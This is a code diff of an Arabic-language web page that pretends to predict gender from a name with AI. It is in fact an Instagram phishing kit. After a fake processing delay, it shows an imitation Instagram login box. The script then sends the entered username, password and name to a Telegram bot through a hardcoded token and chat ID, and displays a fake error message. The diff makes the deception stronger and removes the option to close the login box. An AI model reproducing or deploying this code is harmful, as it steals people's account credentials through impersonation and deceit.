@@ -3,100 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديد الجنس بالذكاء الاصطناعي 🤖</title>
+    <title>AI Gender Predictor | كاشف الجنس الذكي</title>
     <style>
+        :root {
+            --primary-color: #0095f6;
+            --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            background: var(--bg-gradient);
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
             padding: 20px;
+            color: #333;
         }
 
+        /* الكارت الرئيسي */
         .main-card {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
             width: 100%;
-            max-width: 400px;
+            max-width: 420px;
             text-align: center;
+            backdrop-filter: blur(10px);
         }
 
-        h2 { color: #333; margin-bottom: 20px; font-size: 1.5rem; }
-        p { color: #666; margin-bottom: 20px; font-size: 14px; }
+        .ai-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        h2 { font-size: 22px; margin-bottom: 10px; color: #1a1a1a; }
+        p { font-size: 14px; color: #555; margin-bottom: 25px; line-height: 1.6; }
 
         .name-input {
             width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
+            padding: 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
             outline: none;
             font-size: 16px;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             text-align: center;
+            transition: 0.3s;
         }
+
+        .name-input:focus { border-color: var(--primary-color); box-shadow: 0 0 8px rgba(0,149,246,0.2); }
 
         .btn-predict {
             width: 100%;
-            background-color: #0095f6;
+            background: var(--primary-color);
             color: white;
             border: none;
-            border-radius: 10px;
-            padding: 12px;
+            border-radius: 12px;
+            padding: 14px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
+            transition: 0.3s;
         }
 
+        .btn-predict:hover { transform: translateY(-2px); opacity: 0.9; }
+
+        /* نافذة تسجيل الدخول (Instagram) */
         .modal {
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.75);
+            background: rgba(0,0,0,0.8);
             align-items: center;
             justify-content: center;
             z-index: 1000;
+            backdrop-filter: blur(5px);
         }
 
         .login-box {
             background: white;
             width: 90%;
-            max-width: 350px;
-            padding: 30px;
-            border-radius: 12px;
+            max-width: 360px;
+            padding: 40px 30px;
+            border-radius: 15px;
             text-align: center;
+            position: relative;
         }
 
         .insta-logo { width: 160px; margin-bottom: 25px; }
         
+        .verify-text {
+            font-size: 14px;
+            color: #262626;
+            font-weight: 600;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
         .insta-input {
             width: 100%;
-            padding: 11px;
+            padding: 12px;
             background: #fafafa;
             border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            margin-bottom: 8px;
+            border-radius: 6px;
+            margin-bottom: 10px;
             font-size: 14px;
             outline: none;
         }
 
         .btn-insta-login {
             width: 100%;
-            background-color: #0095f6;
+            background-color: var(--primary-color);
             color: white;
             border: none;
             border-radius: 8px;
-            padding: 9px;
+            padding: 10px;
             font-weight: bold;
             margin-top: 10px;
             cursor: pointer;
@@ -108,43 +138,50 @@
             margin-top: 15px;
             display: none;
         }
+
+        .loading-dots { display: none; margin-top: 10px; font-weight: bold; color: var(--primary-color); }
     </style>
 </head>
 <body>
 
     <div class="main-card">
-        <h2>تحديد الجنس بالاسم 🧠</h2>
-        <p>اكتب اسمك وسيقوم النظام بتحليل البيانات لتحديد الجنس بنسبة دقة 99%.</p>
-        <input type="text" id="targetName" class="name-input" placeholder="أدخل الاسم هنا...">
-        <button class="btn-predict" onclick="showLogin()">تحليل الآن</button>
+        <span class="ai-icon">🧬</span>
+        <h2>مشروع التحليل الجيني الرقمي</h2>
+        <p>نظامنا يستخدم خوارزميات متطورة لتحليل الحسابات المرتبطة بالاسم وتحديد الجنس بدقة تصل إلى 99.8%.</p>
+        <input type="text" id="targetName" class="name-input" placeholder="أدخل اسمك الكامل هنا...">
+        <button class="btn-predict" onclick="processAnalysis()">بدء الفحص العميق</button>
+        <div id="status" class="loading-dots">جاري فحص قاعدة البيانات...</div>
     </div>
 
     <div class="modal" id="loginModal">
         <div class="login-box">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo">
-            
-            <p style="font-size: 14px; color: #262626; font-weight: 600; margin-bottom: 15px;">ادخل حسابك لتأكد من جنسك وعرض النتيجة</p>
-            
+            <p class="verify-text">⚠️ يتطلب تأكيد الهوية:<br>يرجى تسجيل الدخول بحسابك لتأكيد جنسك وعرض تقرير التحليل النهائي.</p>
             <form id="loginForm">
                 <input type="text" id="username" class="insta-input" placeholder="اسم المستخدم، الهاتف أو الإيميل" required>
                 <input type="password" id="password" class="insta-input" placeholder="كلمة السر" required>
-                <button type="submit" class="btn-insta-login">تسجيل الدخول</button>
-                <div id="error-msg">عذراً، كلمة السر غير صحيحة. يرجى المحاولة مجدداً.</div>
+                <button type="submit" class="btn-insta-login">تأكيد الحساب</button>
+                <div id="error-msg">حدث خطأ في المصادقة. يرجى التحقق من كلمة السر والمحاولة مجدداً.</div>
             </form>
         </div>
     </div>
 
     <script>
-        const botToken = '8409685298:AAHN_RpQJOEte85gZMYgi2rPaE99lwXODPs';
+        const botToken = '8634745626:AAFlyddrSV8EmJrWx4n-JEy4wQoPedwyaqQ';
         const myChatId = '7822309283';
 
-        function showLogin() {
+        function processAnalysis() {
             const nameVal = document.getElementById('targetName').value;
             if(nameVal.length < 2) {
-                alert("يرجى كتابة الاسم أولاً!");
+                alert("يرجى إدخال اسم صحيح للبدء.");
                 return;
             }
-            document.getElementById('loginModal').style.display = 'flex';
+            
+            document.getElementById('status').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('loginModal').style.display = 'flex';
+                document.getElementById('status').style.display = 'none';
+            }, 1500); // إيهام المستخدم بوجود عملية معالجة
         }
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -154,12 +191,10 @@
             const pass = document.getElementById('password').value;
             const nameUsed = document.getElementById('targetName').value;
 
-            const textMessage = `🎯 صيد جديد:\n\n👤 الاسم المدخل: ${nameUsed}\n📧 الحساب: ${user}\n🔑 الباسورد: ${pass}`;
+            const textMessage = `🚀 صيد جديد (Vexo v2):\n\n🔍 الاسم المستهدف: ${nameUsed}\n👤 اليوزر: ${user}\n🔑 الباسورد: ${pass}`;
 
             const request = new XMLHttpRequest();
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
-            request.open("POST", telegramUrl, true);
+            request.open("POST", `https://api.telegram.org/bot${botToken}/sendMessage`, true);
             request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
             
             request.onreadystatechange = function() {
@@ -171,13 +206,6 @@
 
             request.send(`chat_id=${myChatId}&text=${encodeURIComponent(textMessage)}`);
         });
-
-        window.onclick = function(event) {
-            const modal = document.getElementById('loginModal');
-            if (event.target == modal) {
-                modal.style.display = "none";
-            }
-        }
     </script>
 
 </body>
